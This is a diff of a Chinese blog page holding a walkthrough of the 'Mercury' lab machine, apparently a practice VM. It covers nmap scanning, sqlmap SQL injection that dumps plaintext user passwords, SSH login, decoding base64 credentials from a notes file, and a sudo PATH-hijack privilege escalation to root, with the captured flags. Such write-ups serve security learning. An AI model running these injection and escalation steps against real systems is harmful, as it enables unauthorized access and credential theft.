@@ -109,30 +109,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/05/17/Earth%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/18/Mercury%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/18/Mercury%20Writeup/&text=Mercury Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/18/Mercury%20Writeup/&title=Mercury Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/18/Mercury%20Writeup/&is_video=false&description=Mercury Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Mercury Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/18/Mercury%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/18/Mercury%20Writeup/&title=Mercury Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/18/Mercury%20Writeup/&title=Mercury Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/18/Mercury%20Writeup/&title=Mercury Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/18/Mercury%20Writeup/&title=Mercury Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/18/Mercury%20Writeup/&name=Mercury Writeup&description=&lt;p&gt;该靶机难度不高。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/18/Mercury%20Writeup/&t=Mercury Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">2. 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 网页信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#get-shell"><span class="toc-number">3.</span> <span class="toc-text">3. get shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">4. 权限提升</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">5. 总结</span></a></li></ol>
     </div>
@@ -159,8 +141,6 @@
     <div class="postdate">
       
         <time datetime="2022-05-17T16:00:00.000Z" itemprop="datePublished">2022-05-18</time>
-        
-        (Updated: <time datetime="2022-05-18T12:15:27.458Z" itemprop="dateModified">2022-05-18</time>)
         
       
     </div>
@@ -203,9 +183,7 @@
 </ul>
 <h1 id="信息收集">2. 信息收集</h1>
 <h2 id="端口信息">2.1. 端口信息</h2>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span>. <span class="token function">sudo</span> arp-scan -l
-<span class="token number">2</span>. <span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.51
-<span class="token number">3</span>. <span class="token function">sudo</span> nmap -p22,8080 -A <span class="token number">10.0</span>.2.51<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.51</span><br><span class="line">3. sudo nmap -p22,8080 -A 10.0.2.51</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518185013.png" /></p>
 <p>服务版本信息没有贴出来，不过nmap能够扫出来。</p>
 <h2 id="网页信息">2.2. 网页信息</h2>
@@ -215,44 +193,22 @@
 <p>访问红框中的目录，得到如下界面：</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518190740.png" /></p>
 <p>点击 Load a fact 和 See list，内容分别为：</p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">// Load a fact
-Fact id: 1. (('Mercury does not have any moons or rings.',),)
-
-// See list
-Still todo:
-
--   Add CSS.
--   Implement authentication (using users table)
--   Use models in django instead of direct mysql call
--   All the other stuff, so much!!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// Load a fact</span><br><span class="line">Fact id: 1. ((&#x27;Mercury does not have any moons or rings.&#x27;,),)</span><br><span class="line"></span><br><span class="line">// See list</span><br><span class="line">Still todo:</span><br><span class="line"></span><br><span class="line">-   Add CSS.</span><br><span class="line">-   Implement authentication (using users table)</span><br><span class="line">-   Use models in django instead of direct mysql call</span><br><span class="line">-   All the other stuff, so much!!!</span><br></pre></td></tr></table></figure>
 <p>然后进行路径扫描，没有任何结果，又回到 Load a fact 界面，发现url上面有数字1，测试是否存在sql注入</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518191340.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518191348.png" /></p>
 <p>确实存在SQL注入（其实这里先用单引号会出现报错界面，会提示SQL语句错误，因此判断这里可能存在SQL注入）</p>
-<p>直接丢入sqlmap跑，这里注意需要把1后面的斜杆去掉： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sqlmap -url http://10.0.2.51:8080/mercuryfacts/1 --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>后面就是很常规的。得到结果： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">database: mercury
-tables: facts, users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
-<p>其中facts表中的内容就是 Load a fact 修改url中的数字得到的结果，重点还是在users表中，得到如下结果： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">+----+-----------+-------------------------------+
-| id | username  | password                      |
-+----+-----------+-------------------------------+
-| 1  | john      | johnny1987                    |
-| 2  | laura     | lovemykids111                 |
-| 3  | sam       | lovemybeer111                 |
-| 4  | webmaster | mercuryisthesizeof0.056Earths |
-+----+-----------+-------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>直接丢入sqlmap跑，这里注意需要把1后面的斜杆去掉： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -url http://10.0.2.51:8080/mercuryfacts/1 --dbs</span><br></pre></td></tr></table></figure></p>
+<p>后面就是很常规的。得到结果： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">database: mercury</span><br><span class="line">tables: facts, users</span><br></pre></td></tr></table></figure></p>
+<p>其中facts表中的内容就是 Load a fact 修改url中的数字得到的结果，重点还是在users表中，得到如下结果： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+----+-----------+-------------------------------+</span><br><span class="line">| id | username  | password                      |</span><br><span class="line">+----+-----------+-------------------------------+</span><br><span class="line">| 1  | john      | johnny1987                    |</span><br><span class="line">| 2  | laura     | lovemykids111                 |</span><br><span class="line">| 3  | sam       | lovemybeer111                 |</span><br><span class="line">| 4  | webmaster | mercuryisthesizeof0.056Earths |</span><br><span class="line">+----+-----------+-------------------------------+</span><br></pre></td></tr></table></figure></p>
 <h1 id="get-shell">3. get shell</h1>
 <p>得到了4个账户和密码，但是网页并没有登录界面，目前只有ssh需要账号和密码，因此尝试登录</p>
 <p>最后成功登录 webmaster 账户</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518192252.png" /></p>
 <h1 id="权限提升">4. 权限提升</h1>
-<p>查看 /etc/passwd 中发现，还存在一个普通用户 linuxmaster。在进行信息收集的过程中，发现了一个文件 /home/webmaster/mercury_proj/notes.txt，内容如下： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Project accounts (both restricted):
-webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
-linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
-<p>将后面的字符串进行base64解密，得到： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">webmaster@mercury:~/mercury_proj$ <span class="token builtin class-name">echo</span> <span class="token string">"bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK"</span><span class="token operator">|</span>base64 -d
-mercuryisthesizeof0.056Earths
-webmaster@mercury:~/mercury_proj$ <span class="token builtin class-name">echo</span> <span class="token string">"bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg=="</span><span class="token operator">|</span>base64 -d
-mercurymeandiameteris4880km<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
-<p>因此猜测 linuxmaster 的信息为： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">linuxmaster: mercurymeandiameteris4880km<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>查看 /etc/passwd 中发现，还存在一个普通用户 linuxmaster。在进行信息收集的过程中，发现了一个文件 /home/webmaster/mercury_proj/notes.txt，内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Project accounts (both restricted):</span><br><span class="line">webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK</span><br><span class="line">linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==</span><br></pre></td></tr></table></figure></p>
+<p>将后面的字符串进行base64解密，得到： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webmaster@mercury:~/mercury_proj$ echo &quot;bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK&quot;|base64 -d</span><br><span class="line">mercuryisthesizeof0.056Earths</span><br><span class="line">webmaster@mercury:~/mercury_proj$ echo &quot;bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==&quot;|base64 -d</span><br><span class="line">mercurymeandiameteris4880km</span><br></pre></td></tr></table></figure></p>
+<p>因此猜测 linuxmaster 的信息为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linuxmaster: mercurymeandiameteris4880km</span><br></pre></td></tr></table></figure></p>
 <p>切换用户</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518192846.png" /></p>
 <p>sudo -l查看sudo配置</p>
@@ -273,35 +229,7 @@ mercurymeandiameteris4880km<span aria-hidden="true" class="line-numbers-rows"><s
 <blockquote>
 <p>解释以下：因为当前目录下也有一个tail，并且环境变量中当前目录也是最前面。所以只要执行tail，就会优先执行当前目录下的tail，也就是vim，因为是sudo执行的vim，得到的shell自然就是root。 sudo下的环境变量一般与平常的环境变量不一样，因此需要加上 <code>--preserve-env=PATH</code>，目的就是让sudo以当前的环境执行。</p>
 </blockquote>
-<p>读取两个flag作为收尾 <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">// 1. /home/webmaster/user_flag.txt
-[user_flag_8339915c9a454657bd60ee58776f4ccd]
-
-// 2. /root/root_flag.txt
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@(((/(*(/((((((////////&amp;@@@@@@@@@@@@@
-@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
-@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
-@@@@@@*((####((///*//(///*(/*//((/(((//**/((&amp;@@@@@
-@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
-@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
-@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
-@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
-@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
-@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
-@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
-@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
-@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
-@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
-@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
-@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
-@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-
-Congratulations on completing Mercury!!!
-If you have any feedback please contact me at SirFlash@protonmail.com
-[root_flag_69426d9fda579afbffd9c2d47ca31d90]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>读取两个flag作为收尾 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// 1. /home/webmaster/user_flag.txt</span><br><span class="line">[user_flag_8339915c9a454657bd60ee58776f4ccd]</span><br><span class="line"></span><br><span class="line">// 2. /root/root_flag.txt</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@@@@(((/(*(/((((((////////&amp;@@@@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@</span><br><span class="line">@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@</span><br><span class="line">@@@@@@*((####((///*//(///*(/*//((/(((//**/((&amp;@@@@@</span><br><span class="line">@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@</span><br><span class="line">@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@</span><br><span class="line">@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@</span><br><span class="line">@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@</span><br><span class="line">@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@</span><br><span class="line">@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@</span><br><span class="line">@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@</span><br><span class="line">@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@</span><br><span class="line">@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@</span><br><span class="line">@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@</span><br><span class="line">@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@</span><br><span class="line">@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line"></span><br><span class="line">Congratulations on completing Mercury!!!</span><br><span class="line">If you have any feedback please contact me at SirFlash@protonmail.com</span><br><span class="line">[root_flag_69426d9fda579afbffd9c2d47ca31d90]</span><br></pre></td></tr></table></figure></p>
 <h1 id="总结">5. 总结</h1>
 <p>该靶机总体来说还是比较简单的，最后环境变量提权确实用的少。涉及到如下攻击方法：</p>
 <ol type="1">
@@ -365,7 +293,6 @@ If you have any feedback please contact me at SirFlash@protonmail.com
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
